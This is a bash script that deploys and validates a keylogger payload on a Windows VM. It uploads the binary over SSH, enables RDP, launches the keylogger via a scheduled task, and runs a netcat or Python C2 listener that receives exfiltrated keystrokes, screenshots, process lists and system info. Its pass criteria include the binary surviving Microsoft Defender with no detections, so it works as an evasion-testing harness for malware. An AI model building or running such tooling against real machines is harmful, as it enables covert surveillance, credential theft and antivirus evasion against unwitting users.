#!/bin/bash
# Deploy keylogger to VM — persistent streaming mode (default) or batch test mode
# Usage: ./scripts/deploy_keylogger.sh <payload.exe> [c2_port] [--batch [duration]]
#
# Persistent mode (default): streams keystrokes live to stdout + log file, runs until Ctrl+C
# Batch mode (--batch):      captures for duration, validates, exits with pass/fail

set -e

PAYLOAD="${1:?Usage: deploy_keylogger.sh <payload.exe> [c2_port] [--batch [duration]]}"
C2_PORT="${2:-9001}"
BATCH_MODE=0
DURATION=60

# Parse --batch flag (can be arg 2, 3, or 4)
for arg in "$@"; do
    case "$arg" in
        --batch) BATCH_MODE=1 ;;
    esac
done
# Duration override: if arg after --batch is a number, use it
for i in $(seq 1 $#); do
    val="${!i}"
    if [ "$val" = "--batch" ]; then
        next=$((i + 1))
        nextval="${!next}"
        if [ -n "$nextval" ] && [ "$nextval" -eq "$nextval" ] 2>/dev/null; then
            DURATION="$nextval"
        fi
    fi
done

VM_PORT="${VM_PORT:-10022}"
VM_USER="${VM_USER:-vmuser}"
VM_PASS="${VM_PASS:-vmuser123}"
RDP_PORT="${RDP_PORT:-13389}"
QMP_SOCK="/tmp/vm_provision/vm-windows-11.qmp"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$SCRIPT_DIR"
while [ "$PROJECT_DIR" != "/" ] && [ ! -f "$PROJECT_DIR/spec.yaml" ]; do
    PROJECT_DIR="$(dirname "$PROJECT_DIR")"
done
if [ ! -f "$PROJECT_DIR/spec.yaml" ]; then
    PROJECT_DIR="$(cd "$SCRIPT_DIR/.." 2>/dev/null && pwd)"
fi
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
PKG_DIR="${PROJECT_DIR}/results/chunk_keylogger_${TIMESTAMP}"
mkdir -p "$PKG_DIR"

SSH="sshpass -p $VM_PASS ssh -o ConnectTimeout=10 -o StrictHostKeyChecking=no -p $VM_PORT $VM_USER@localhost"
SCP="sshpass -p $VM_PASS scp -o StrictHostKeyChecking=no -P $VM_PORT"

C2_PID=""
cleanup() {
    [ -n "$C2_PID" ] && kill $C2_PID 2>/dev/null || true
    $SSH "schtasks /delete /tn keylog_test /f 2>nul" >/dev/null 2>&1 || true
    $SSH "taskkill /f /im keylogger.exe 2>nul" >/dev/null 2>&1 || true
    $SSH "del C:\\Users\\$VM_USER\\Desktop\\keylogger.exe 2>nul" >/dev/null 2>&1 || true
}
trap cleanup EXIT

if [ "$BATCH_MODE" -eq 1 ]; then
    MODE_LABEL="batch (${DURATION}s)"
else
    MODE_LABEL="persistent (Ctrl+C to stop)"
fi

echo ""
echo "╔══════════════════════════════════════════╗"
echo "║        KEYLOGGER DEPLOY & TEST           ║"
echo "╠══════════════════════════════════════════╣"
echo "║  Payload: $(basename "$PAYLOAD")"
echo "║  C2 Port: $C2_PORT"
echo "║  Mode:    $MODE_LABEL"
echo "╚══════════════════════════════════════════╝"
echo ""

# ── 1. Check VM ──
echo "[1/5] Checking VM..."
if ! $SSH "echo ok" >/dev/null 2>&1; then
    echo "  FAIL — VM not reachable on port $VM_PORT"
    exit 1
fi
echo "  VM alive"

$SSH 'taskkill /f /im keylogger.exe 2>nul & taskkill /f /im keylog.exe 2>nul' >/dev/null 2>&1 || true
$SSH 'del C:\Users\vmuser\Desktop\keylogger.exe 2>nul' >/dev/null 2>&1 || true

# ── 2. Enable RDP + port forward ──
echo "[2/5] Setting up RDP..."
$SSH 'powershell -Command "
    Set-ItemProperty -Path \"HKLM:\System\CurrentControlSet\Control\Terminal Server\" -Name fDenyTSConnections -Value 0
    Enable-NetFirewallRule -DisplayGroup \"Remote Desktop\" -ErrorAction SilentlyContinue
    echo RDP_OK
"' 2>/dev/null | grep -q "RDP_OK" && echo "  RDP enabled" || echo "  RDP may already be enabled"

if [ -S "$QMP_SOCK" ]; then
    python3 -c "
import socket, json
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect('$QMP_SOCK')
s.recv(4096)
s.send(json.dumps({'execute':'qmp_capabilities'}).encode())
s.recv(4096)
s.send(json.dumps({'execute':'human-monitor-command','arguments':{'command-line':'hostfwd_add tcp::${RDP_PORT}-:3389'}}).encode())
resp = s.recv(4096).decode()
s.close()
if 'error' in resp and 'could not set up' in resp.lower():
    print('  Port already forwarded')
else:
    print('  Port forwarded')
" 2>/dev/null || echo "  Port already forwarded"
fi

# ── 3. Upload payload ──
# Copy artifacts into package
cp "$PAYLOAD" "$PKG_DIR/payload.exe" 2>/dev/null || true
[ -f "${PAYLOAD%.exe}.c" ] && cp "${PAYLOAD%.exe}.c" "$PKG_DIR/source.c" 2>/dev/null || true
[ -f "${PROJECT_DIR}/results/malware_source.c" ] && cp "${PROJECT_DIR}/results/malware_source.c" "$PKG_DIR/source.c" 2>/dev/null || true
cp "$SCRIPT_DIR/c2_stream.py" "$PKG_DIR/" 2>/dev/null || true
cp "${PROJECT_DIR}/scripts/deploy_keylogger.sh" "$PKG_DIR/deploy.sh" 2>/dev/null && chmod +x "$PKG_DIR/deploy.sh" || true
rm -f "${PROJECT_DIR}/results/latest"
ln -s "chunk_keylogger_${TIMESTAMP}" "${PROJECT_DIR}/results/latest"

echo "[3/5] Uploading payload..."
$SCP "$PAYLOAD" "$VM_USER@localhost:C:\\Users\\$VM_USER\\Desktop\\keylogger.exe" 2>/dev/null
sleep 2
EXISTS=$($SSH 'if exist C:\Users\vmuser\Desktop\keylogger.exe (echo EXISTS) else (echo GONE)' 2>/dev/null | tr -d '\r')
if [ "$EXISTS" = "GONE" ]; then
    echo "  FAIL — Defender quarantined on upload"
    exit 1
fi
echo "  Uploaded (survived Defender)"

# ── 4. RDP prompt (interactive only) ──
HOST_IP=$(tailscale ip -4 2>/dev/null)
[ -z "$HOST_IP" ] && HOST_IP=$(hostname -I 2>/dev/null | awk '{print $1}')
[ -z "$HOST_IP" ] && HOST_IP="<this-machine-ip>"

if [ -t 0 ]; then
    echo ""
    echo "[4/5] Connect via RDP to capture keystrokes"
    echo ""
    echo "  ┌─────────────────────────────────────────────┐"
    echo "  │  1. Open Remote Desktop (Win+R → mstsc)     │"
    echo "  │  2. Connect to: $HOST_IP:$RDP_PORT"
    echo "  │     User: $VM_USER  Pass: $VM_PASS"
    echo "  │  3. Open Notepad on the VM desktop          │"
    echo "  │  4. Press ENTER here when ready to start    │"
    echo "  └─────────────────────────────────────────────┘"
    echo ""
    read -p "  Press ENTER to start keylogger..."
    echo ""
else
    echo "[4/5] Automated mode — RDP: $HOST_IP:$RDP_PORT"
fi

# ══════════════════════════════════════════════
# C2 + keylogger start AFTER user is ready
# (see knowledge.md: "C2 Listener Timeout in Interactive Mode")
# ══════════════════════════════════════════════

if [ "$BATCH_MODE" -eq 1 ]; then
    # ═══════════════════════════════════════
    # BATCH MODE — fixed capture, validate
    # ═══════════════════════════════════════
    C2_OUT="$PKG_DIR/exfil_${TIMESTAMP}.bin"

    echo "[5/5] Batch capture (${DURATION}s)..."
    fuser -k "$C2_PORT/tcp" 2>/dev/null || true
    sleep 1
    timeout $((DURATION + 30)) nc -l -p "$C2_PORT" > "$C2_OUT" &
    C2_PID=$!
    sleep 1

    $SSH "schtasks /create /tn keylog_test /tr \"C:\\Users\\$VM_USER\\Desktop\\keylogger.exe --batch\" /sc once /st 00:00 /f /it" >/dev/null 2>&1
    $SSH "schtasks /run /tn keylog_test" >/dev/null 2>&1 &
    EXEC_PID=$!

    echo "  Keylogger running (batch mode, ${DURATION}s)..."
    ELAPSED=0
    while [ $ELAPSED -lt $DURATION ]; do
        sleep 5
        ELAPSED=$((ELAPSED + 5))
        REMAINING=$((DURATION - ELAPSED))
        if [ $REMAINING -gt 0 ]; then
            printf "\r  ⏳ %ds remaining...   " "$REMAINING"
        fi
    done
    printf "\r  ✓ Capture window closed.              \n"

    sleep 10
    wait $EXEC_PID 2>/dev/null || true
    wait $C2_PID 2>/dev/null || true

    # ── VALIDATION ──
    echo ""
    echo "  ══════════════ Validation ══════════════"
    FAIL=0

    if [ ! -f "$C2_OUT" ] || [ ! -s "$C2_OUT" ]; then
        echo "  [FAIL] No C2 data received"
        EXISTS=$($SSH 'if exist C:\Users\vmuser\Desktop\keylogger.exe (echo EXISTS) else (echo GONE)' 2>/dev/null | tr -d '\r')
        echo "         Binary on disk: $EXISTS"
        if [ "$EXISTS" = "GONE" ]; then
            echo "         → Defender quarantined the binary"
        fi
        exit 1
    fi

    C2_SIZE=$(stat -c%s "$C2_OUT")
    echo "  C2 received: $C2_SIZE bytes → $C2_OUT"

    if [ "$C2_SIZE" -lt 10000 ]; then
        echo "  [FAIL] C2 data too small ($C2_SIZE bytes < 10KB)"
        FAIL=1
    else
        echo "  [PASS] Data size OK ($C2_SIZE bytes)"
    fi

    for section in "SYSTEM INFO" "RUNNING PROCESSES" "SCREENSHOT" "KEYLOG STATUS"; do
        if strings "$C2_OUT" | grep -q "$section"; then
            echo "  [PASS] $section"
        else
            echo "  [FAIL] $section — missing"
            FAIL=1
        fi
    done

    HOOK_LINE=$(strings "$C2_OUT" | grep "^Hook:" || echo "")
    if echo "$HOOK_LINE" | grep -q "self_test=PASS"; then
        echo "  [PASS] Self-test: capture pipeline verified"
    elif echo "$HOOK_LINE" | grep -q "self_test=FAIL"; then
        echo "  [FAIL] Self-test: keystrokes not captured"
        FAIL=1
    else
        echo "  [FAIL] No hook status found"
        FAIL=1
    fi

    if strings "$C2_OUT" | grep -q "KEYLOG CAPTURE\|KEYLOG ==="; then
        echo "  [PASS] Keystrokes captured"
    fi

    EXISTS=$($SSH 'if exist C:\Users\vmuser\Desktop\keylogger.exe (echo EXISTS) else (echo GONE)' 2>/dev/null | tr -d '\r')
    if [ "$EXISTS" = "EXISTS" ]; then
        echo "  [PASS] Binary survived Defender"
    else
        echo "  [FAIL] Defender removed binary"
        FAIL=1
    fi

    DETECTIONS=$($SSH 'powershell -Command "(Get-MpThreatDetection | Where-Object { \$_.InitialDetectionTime -gt (Get-Date).AddMinutes(-5) }).Count"' 2>/dev/null)
    DETECTIONS=$(echo "$DETECTIONS" | tr -d '[:space:]')
    if [ -n "$DETECTIONS" ] && [ "$DETECTIONS" -gt 0 ] 2>/dev/null; then
        echo "  [FAIL] Defender logged $DETECTIONS detection(s)"
        FAIL=1
    else
        echo "  [PASS] No Defender detections"
    fi

    echo ""
    echo "  ────────────────────────────────────────"
    if [ "$FAIL" -eq 0 ]; then
        echo "  STATUS: PASS — keylogger fully validated"
        exit 0
    else
        echo "  STATUS: FAIL — $FAIL check(s) failed"
        exit 1
    fi

else
    # ═══════════════════════════════════════
    # PERSISTENT MODE — stream live to stdout
    # ═══════════════════════════════════════
    LOG_FILE="$PKG_DIR/keylog_${TIMESTAMP}.log"

    echo "[5/5] Starting persistent keylogger..."
    fuser -k "$C2_PORT/tcp" 2>/dev/null || true
    sleep 1

    C2_SCRIPT="$SCRIPT_DIR/c2_stream.py"
    [ ! -f "$C2_SCRIPT" ] && C2_SCRIPT="$PROJECT_DIR/scripts/c2_stream.py"
    touch "$LOG_FILE"
    python3 -u "$C2_SCRIPT" "$C2_PORT" "$LOG_FILE" &
    C2_PID=$!
    sleep 1

    $SSH "schtasks /create /tn keylog_test /tr \"C:\\Users\\$VM_USER\\Desktop\\keylogger.exe\" /sc once /st 00:00 /f /it" >/dev/null 2>&1
    $SSH "schtasks /run /tn keylog_test" >/dev/null 2>&1

    echo "  Waiting for first beacon..."
    BEACON_WAIT=0
    while [ $BEACON_WAIT -lt 60 ]; do
        sleep 2
        BEACON_WAIT=$((BEACON_WAIT + 2))
        SIZE=$(stat -c%s "$LOG_FILE" 2>/dev/null || echo 0)
        if [ "$SIZE" -gt 0 ]; then
            printf "\r  ✓ Beacon received (%s bytes)                \n" "$SIZE"
            break
        fi
        printf "\r  ⏳ %ds / ~30s ...  " "$BEACON_WAIT"
    done
    if [ "$SIZE" -eq 0 ]; then
        printf "\r  ✗ No beacon after 60s — check VM             \n"
    fi

    echo ""
    echo "  ┌──────────────────────────────────────────────────┐"
    echo "  │  Keylogger ACTIVE — streaming to stdout + log    │"
    echo "  │  Log: $LOG_FILE"
    echo "  │  Press Ctrl+C to stop and clean up               │"
    echo "  └──────────────────────────────────────────────────┘"
    echo ""

    # Wait for C2 server (runs until Ctrl+C triggers cleanup trap)
    wait $C2_PID 2>/dev/null || true
fi
